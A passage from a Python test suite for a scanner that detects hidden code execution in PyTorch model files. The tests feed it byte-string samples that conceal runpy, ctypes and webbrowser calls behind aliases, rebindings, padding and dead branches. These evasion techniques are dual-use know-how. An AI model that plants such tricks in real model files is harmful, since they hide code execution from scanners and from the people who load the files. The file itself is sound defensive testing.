            + import_line
            + boundary_padding
            + b"(\n runner\n)('payload.py')\n"
            + trailing_padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert (
            len(import_line + boundary_padding + b"(\n")
            == jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
        )
        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_late_parenthesized_priority_alias_argument(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + b"print((rp))\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("call", [b"(\n runner\n)('safe')\n", b"runner \\\n('safe')\n"])
    def test_scan_model_preserves_visible_safe_rebind_before_late_continued_alias_call(self, call: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + b"runner = print\n"
            + call
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_visible_safe_module_rebind_before_late_parenthesized_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"rp = object()\n"
            + b"((rp).run_path)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize("safe_rebind", [b"runner = (\n    print\n)\n", b"runner = \\\n    print\n"])
    def test_scan_model_preserves_multiline_safe_rebind_before_late_parenthesized_call(
        self, safe_rebind: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + safe_rebind
            + b"(runner)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_parenthesized_alias_restored_after_visible_safe_rebind(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + padding
            + b"original = runner\n"
            + b"runner = print\n"
            + b"runner = original\n"
            + b"(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_state", "expect_finding"),
        [
            (
                b"original = runner\nrunner = original\noriginal = print\n(runner)('payload.py')\n",
                True,
            ),
            (
                b"original = print\nrunner = original\noriginal = runner\n(runner)('safe')\n",
                False,
            ),
        ],
    )
    def test_scan_model_resolves_late_parenthesized_alias_dependencies_at_rebind_time(
        self, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n" + padding + late_state + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    def test_scan_model_ignores_passive_alias_members_before_late_parenthesized_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + passive_members
            + b"((rp).run_path)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_safe_member_overwrite_after_passive_alias_members(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + passive_members
            + b"rp.run_path = print\n"
            + passive_members
            + b"((rp).run_path)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_state", "expect_finding"),
        [
            (b"if False:\n    runner = print\n(runner)('payload.py')\n", True),
            (b"if False:\n    # inert\n    runner = print\n(runner)('payload.py')\n", True),
            (b"if True:\n    runner = print\n(runner)('safe')\n", False),
            (b"if True:\n    # inert\n    runner = print\n(runner)('safe')\n", False),
        ],
    )
    def test_scan_model_handles_constant_guarded_late_alias_rebindings(
        self, late_state: bytes, expect_finding: bool
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n" + padding + late_state + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")
        has_dynamic_finding = any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

        assert has_dynamic_finding is expect_finding

    def test_scan_model_detects_constant_guarded_late_alias_restore(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + b"original = runner\n"
            + b"runner = print\n"
            + padding
            + b"if True:\n    runner = original\n(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "restore",
        [
            b"if False:\n    pass\nelse:\n    runner = original\n",
            b"if True:\n    if True:\n        runner = original\n",
        ],
    )
    def test_scan_model_detects_compound_late_alias_restore(self, restore: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"from runpy import run_path as runner\n"
            + b"original = runner\nrunner = print\n"
            + padding
            + restore
            + b"(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"runner = rp.run_path if False else print\n(runner)('safe')\n",
            b"runner = print if 1 else rp.run_path\n(runner)('safe')\n",
            b"runner = rp.run_path and print\n(runner)('safe')\n",
            b"runner = True or rp.run_path\n(runner)('safe')\n",
            b"runner = print or rp.run_path\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif False:\n    if True:\n"
            b"        runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif True:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif 1:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif False:\n    pass\nelif True:\n    pass\nelse:\n"
            b"    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif 'enabled':\n    pass\nelse:\n"
            b"    runner = original\n(runner)('safe')\n",
            b"original = runner\nrunner = print\nif True:\n    pass\nelif False:\n    pass\nelse:\n"
            b"    runner = original\n(runner)('safe')\n",
            b"if globals().get('enabled'):\n    runner = print\nelif True:\n    runner = print\n(runner)('safe')\n",
            b"getattr(object=rp, name='run_path')('safe')\n",
        ],
    )
    def test_scan_model_preserves_definitely_safe_late_conditional_alias_state(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\nfrom runpy import run_path as runner\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"enabled = True\nrunner = rp.run_path if enabled else print\n"
            b"if globals().get('safe'):\n    runner = print\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\nif globals().get('enabled'):\n    pass\n"
            b"elif True:\n    runner = print\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\noriginal = runner\nif globals().get('safe'):\n"
            b"    runner = print\n    if globals().get('restore'):\n        runner = original\n"
            b"else:\n    runner = print\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
            b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
            b"\x00\xfffrom runpy import run_path as runner\nprint = runner\nif globals().get('enabled'):\n"
            b"    runner = print\nelse:\n    runner = print\n(runner)('payload.py')\n",
        ],
    )
    def test_scan_model_detects_late_alias_after_uncertain_safe_overwrite(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "late_state",
        [
            b"import builtins\nbuiltins.print = False\nrunner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins)['print'] = False\n"
            b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins).update({'print': False})\n"
            b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
            b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"import builtins\nvars(builtins).update(**{'print': False})\n"
            b"runner = print or rp.run_path\n(runner)('payload.py')\n",
            b"from runpy import run_path as runner\nFalse and (runner := print)\n(runner)('payload.py')\n",
            (
                b"from runpy import run_path as runner\nclass Broken:\n"
                b"    def __enter__(self):\n        raise RuntimeError()\n"
                b"    def __exit__(self, *args):\n        return False\n"
                b"try:\n    with Broken() as runner:\n        pass\n"
                b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
            ),
        ],
    )
    def test_scan_model_detects_late_alias_after_non_executed_safe_shadow(self, late_state: bytes) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport runpy as rp\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_retained_alias_after_raising_late_with_shadow(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        late_state = (
            b"class Broken:\n    def __enter__(self):\n        raise RuntimeError()\n"
            b"    def __exit__(self, *args):\n        return False\n"
            b"try:\n    with Broken() as runner:\n        pass\n"
            b"except RuntimeError:\n    pass\n(runner)('payload.py')\n"
        )
        source = b"\x00\xfffrom runpy import run_path as runner\n" + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_forwarded_late_ctypes_attribute_load(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xffimport ctypes as c\n" + padding + b"loader = c.cdll\nloader.msvcrt\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"import builtins\nvars(builtins).update(**{'print': False})\n"
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins\nvars(builtins)['pri' + 'nt'] = False\n"
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins\nvars(builtins).update(**{'print': False})\n"
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_boolean_fallback_after_static_builtin_mapping_mutation(
        self, prefix: bytes, late_state: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "unexpected_pattern"),
        [
            (
                b"import runpy as rp\n",
                b"runner = print or rp.run_path\nrunner('safe')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"opener = print or wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = print or c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_safe_boolean_fallback_after_builtin_restore(
        self, prefix: bytes, late_state: bytes, unexpected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        state = (
            b"import builtins\noriginal = builtins.print\n"
            b"vars(builtins)['print'] = False\nvars(builtins).update({'print': original})\n"
        )
        source = b"\x00\xff" + prefix + padding + state + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == unexpected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "unexpected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"wb.open = print\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.CDLL = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.cdll = print\nloader = c.cdll\nloader.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"vars(wb).update(open=print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"setattr(wb, 'open', print)\nopener = wb.open\nopener('safe')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"c.__dict__['CDLL'] = print\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('safe')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_safe_late_typed_member_overwrite(
        self, prefix: bytes, late_state: bytes, unexpected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == unexpected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "late_state", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"opener = wb.open\nwb.open = print\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = c.CDLL\nc.CDLL = print\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"loader = c.cdll\nc.cdll = print\nloader.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nwb.open = original\n"
                b"opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nc.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_dangerous_typed_member_captured_before_safe_overwrite(
        self, prefix: bytes, late_state: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    @pytest.mark.parametrize(
        ("prefix", "initial_binding", "endpoint", "expected_pattern"),
        [
            (
                b"import webbrowser as wb\n",
                b"value_0 = wb.open\n",
                b"value_1999('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"value_0 = c.CDLL\n",
                b"value_1999('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"value_0 = c.cdll\n",
                b"value_1999.msvcrt\n",
                "Native library loading detected",
            ),
            (
                b"from webbrowser import open as value_0\n",
                b"",
                b"value_1999('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"from ctypes import CDLL as value_0\n",
                b"",
                b"value_1999('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"from ctypes import cdll as value_0\n",
                b"",
                b"value_1999.msvcrt\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_preserves_late_rule_identity_beyond_replay_budget(
        self, prefix: bytes, initial_binding: bytes, endpoint: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = initial_binding + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xff" + prefix + padding + bindings + endpoint + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )
        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern == "Dynamic module execution detected"
            and expected_pattern != "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_bounds_typed_proof_inference_for_repeated_late_member_bindings(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"".join(
            (f"wb.open = wb{' ' * (index + 1)}.open\nvalue_{index} = wb{' ' * (index + 1)}.open\n").encode()
            for index in range(500)
        )
        source = (
            b"\x00\xffimport webbrowser as wb\n"
            + padding
            + bindings
            + b"value_499('https://example.invalid')\n"
            + padding
        )
        resolver_calls = 0
        real_resolver = jit_script_module._resolve_alias_aware_high_risk_calls

        def counting_resolver(tree: ast.AST) -> set[tuple[str, str]]:
            nonlocal resolver_calls
            resolver_calls += 1
            return real_resolver(tree)

        monkeypatch.setattr(jit_script_module, "_resolve_alias_aware_high_risk_calls", counting_resolver)

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert resolver_calls <= jit_script_module._MAX_PRIORITY_ASSIGNMENT_PROBES + 10

    @pytest.mark.parametrize("shadow", [b"class runner:\n    pass\n", b"del runner\n"])
    def test_scan_model_preserves_definite_late_alias_shadow(self, shadow: bytes) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xfffrom runpy import run_path as runner\n" + padding + shadow + b"(runner)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_forwarded_late_class_shadow(self) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"runner = rp.run_path\nclass runner:\n    pass\nforward = runner\n(forward)('safe')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("prefix_state", "late_state", "expect_finding"),
        [
            (b"", b"rp.run_path = print\n" + b"rp.run_module = print\n" * 8, False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"rp.run_path: object = original\n" + b"rp.run_module = print\n" * 8,
                True,
            ),
            (b"", b"del rp.run_path\n", False),
            (b"", b"rp.__dict__['run_path'] = print\n", False),
            (b"", b"vars(rp).update(run_path=print)\n", False),
            (b"", b"rp.__dict__.update({'other': print, 'run_path': print})\n", False),
            (b"", b"vars(rp).update(other=print, run_path=print)\n", False),
            (b"", b"rp.__dict__.update(**{'run_path': print})\n", False),
            (b"", b"dict.update(rp.__dict__, run_path=print)\n", False),
            (b"", b"overwrite = dict.update\noverwrite(rp.__dict__, run_path=print)\n", False),
            (
                b"",
                b"import builtins\noverwrite = builtins.dict.update\noverwrite(rp.__dict__, run_path=print)\n",
                False,
            ),
            (b"", b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=print)\n", False),
            (b"", b"ns = rp.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"restore = vars(rp).update\nrestore(run_path=print)\n", False),
            (b"", b"\x00\xffns = rp.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"\x00\xffrestore = vars(rp).update\nrestore(run_path=print)\n", False),
            (b"", b"mod = rp\nns = mod.__dict__\nns.update(run_path=print)\n", False),
            (b"", b"mod = rp\nrestore = vars(mod).update\nrestore(run_path=print)\n", False),
            (b"", b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\nrestore(run_path=print)\n", False),
            (
                b"",
                b"mod = rp\nmapping = mod.__dict__\nsecond = mapping\nrestore = second.update\n"
                b"restore(run_path=print)\n",
                False,
            ),
            (
                b"",
                b"mod = rp\nmapping = mod.__dict__\nrestore = mapping.update\napply = restore\napply(run_path=print)\n",
                False,
            ),
            (b"", b"rp.__dict__['run' + '_path'] = print\n", False),
            (b"", b"rp.__dict__[\n    'run' + '_path'\n] = print\n", False),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"dict = Safe\ndict.update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nbi.dict = Safe\nbuiltins.dict.update(rp.__dict__, run_path=original)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
                b"dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"real_dict = dict\ndict = Safe\ndict = real_dict\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nreal_dict = bi.dict\nbi.dict = Safe\nbi.dict = real_dict\n"
                b"builtins.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"original = rp.run_path\nrp.run_path = print\n",
                b"import builtins as bi\nbi.dict.update(rp.__dict__, run_path=original)\n",
                True,
            ),
            (
                b"",
                b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
                b"if globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                True,
            ),
            (
                b"",
                b"rp.run_path = print\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    dict = Safe\n"
                b"dict.update(rp.__dict__, run_path=print)\n",
                False,
            ),
            (
                b"",
                b"import builtins\nclass Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n"
                b"        pass\nif globals().get('enabled'):\n    builtins.dict = Safe\n"
                b"builtins.dict.update(rp.__dict__, run_path=print)\n",
